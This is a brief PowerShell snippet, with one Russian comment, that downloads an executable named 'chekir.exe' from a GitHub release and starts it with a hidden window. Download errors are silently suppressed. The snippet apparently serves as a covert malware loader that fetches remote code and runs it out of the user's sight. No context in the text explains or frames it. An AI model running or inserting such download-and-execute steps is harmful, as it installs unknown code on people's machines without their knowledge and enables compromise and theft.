Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe" -OutFile "chekir.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden


